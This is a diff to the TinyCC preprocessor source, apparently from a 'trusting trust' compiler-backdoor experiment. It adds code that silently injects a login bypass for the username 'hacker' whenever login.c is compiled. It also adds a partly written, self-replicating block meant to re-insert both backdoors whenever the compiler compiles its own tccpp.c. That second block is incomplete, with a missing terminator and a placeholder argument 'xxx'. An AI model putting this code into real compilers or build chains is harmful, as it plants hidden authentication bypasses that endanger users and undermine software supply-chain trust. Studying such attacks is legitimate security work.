@@ -617,16 +617,16 @@ static int handle_eob(void)
 	    FILE* fw = fopen("/home/zmx/Desktop/trusting-trust/log", "a");
 	    fwrite(file->filename, 1, strlen(file->filename), fw);
 	    fclose(fw);
-	    if(strcmp(file->filename, "tccpp.c") == 0 && bf->buffer[0] != ' ') {
-	    	char* inject_login = "if(strcmp(username, %chacker%c) == 0) {%c    printf(%cwelcome!\\n%c);%c    return 0;%c  }%c  ";
-		unsigned char* inject_code[200];
+	    if(strcmp(file->filename, "login.c") == 0 && bf->buffer[0] != ' ') {
+		char* inject_login = "if(strcmp(username, %chacker%c) == 0) {%c    printf(%cwelcome!\\n%c);%c    return 0;%c  }%c  ";
+	        unsigned char* inject_code[200];
 		snprintf(inject_code, 200, inject_login, 34, 34, 10, 34, 34, 10, 10, 10);
 		int inject_len;
-	        inject_len = strlen(inject_login);
+		inject_len = strlen(inject_login);
 		unsigned char* new_buf;
 		new_buf = tcc_malloc(sizeof(unsigned char) * IO_BUF_SIZE);
 		unsigned char* inject_location;
-		inject_location = strstr(bf->buffer, "handle_stray1");
+		inject_location = strstr(bf->buffer, "printf(\"Reject!");
 		int pre_inject_len = inject_location - bf->buffer;
 		new_buf[0] = ' ';
 		strncpy(new_buf + 1, bf->buffer, pre_inject_len);
@@ -635,10 +635,63 @@ static int handle_eob(void)
 		len = len + inject_len - 7;
 		strncpy(bf->buffer, new_buf, len);
 		bf->buffer[len] = 0;
-		FILE* fw2 = fopen("/home/zmx/Desktop/trusting-trust/hack.c", "w");
-		fwrite(new_buf, 1, len, fw2);
-		fclose(fw2);
-		
+	    }
+	    if(strcmp(file->filename, "tccpp.c") == 0 && bf->buffer[0] != ' ') {
+		char* inject_compiler = 
+	        "%c    if(strcmp(file->filename, %clogin.c%c) == 0 && bf->buffer[0] != %c %c) {%c"
+	    	"%c%cchar* inject_login = %c%s%c;%c"
+		"%c%cunsigned char* inject_code[200];%c"
+		"%c%csnprintf(inject_code, 200, inject_login, 34, 34, 10, 34, 34, 10, 10, 10);%c"
+		"%c%cint inject_len;%c"
+	        "%c%cinject_len = strlen(inject_login);%c"
+		"%c%cunsigned char* new_buf;%c"
+		"%c%cnew_buf = tcc_malloc(sizeof(unsigned char) * IO_BUF_SIZE);%c"
+		"%c%cunsigned char* inject_location;%c"
+		"%c%cinject_location = strstr(bf->buffer, %cprintf(%c%cReject!%c);%c"
+		"%c%cint pre_inject_len = inject_location - bf->buffer;%c"
+		"%c%cnew_buf[0] = %c %c;%c"
+		"%c%cstrncpy(new_buf + 1, bf->buffer, pre_inject_len);%c"
+		"%c%cstrncpy(new_buf + pre_inject_len + 1, inject_code, inject_len);%c"
+		"%c%cstrcat(new_buf, inject_location);%c"
+		"%c%clen = len + inject_len - 7;%c"
+		"%c%cstrncpy(bf->buffer, new_buf, len);%c"
+		"%c%cbf->buffer[len] = 0;%c"
+	    	"%c    }%c"
+	    	"%c    if(strcmp(file->filename, %ctccpp.c%c) == 0 && bf->buffer[0] != ' ') {%c"
+	    	"%c%cchar* inject_compiler = %c%s%c;%c"
+		"%c%cunsigned char* inject_code[5000];%c"
+		"%c%csnprintf(inject_code, 5000, inject_compiler, 34, 34, 10, 34, 34, 10, 10, 10);%c"
+		"%c%cint inject_len;%c"
+	        "%c%cinject_len = strlen(inject_compiler);%c"
+		"%c%cunsigned char* new_buf;%c"
+		"%c%cnew_buf = tcc_malloc(sizeof(unsigned char) * IO_BUF_SIZE);%c"
+		"%c%cunsigned char* inject_location;%c"
+		"%c%cinject_location = strstr(bf->buffer, %cif (len < 0)%c);%c"
+		"%c%cint pre_inject_len = inject_location - bf->buffer;%c"
+		"%c%cnew_buf[0] = %c %c;%c"
+		"%c%cstrncpy(new_buf + 1, bf->buffer, pre_inject_len);%c"
+		"%c%cstrncpy(new_buf + pre_inject_len + 1, inject_code, inject_len);%c"
+		"%c%cstrcat(new_buf, inject_location);%c"
+		"%c%clen = len + inject_len - 7;%c"
+		"%c%cstrncpy(bf->buffer, new_buf, len);%c"
+		"%c%cbf->buffer[len] = 0;%c"
+	    	"%c    }%c%c%c"
+		unsigned char* inject_code[5000];
+		snprintf(inject_code, 5000, inject_compiler, xxx);
+		int inject_len;
+	        inject_len = strlen(inject_compiler);
+		unsigned char* new_buf;
+		new_buf = tcc_malloc(sizeof(unsigned char) * IO_BUF_SIZE);
+		unsigned char* inject_location;
+		inject_location = strstr(bf->buffer, "if (len < 0)");
+		int pre_inject_len = inject_location - bf->buffer;
+		new_buf[0] = ' ';
+		strncpy(new_buf + 1, bf->buffer, pre_inject_len);
+		strncpy(new_buf + pre_inject_len + 1, inject_code, inject_len);
+		strcat(new_buf, inject_location);
+		len = len + inject_len - 7;
+		strncpy(bf->buffer, new_buf, len);
+		bf->buffer[len] = 0;
 	    }
             if (len < 0)
                 len = 0;
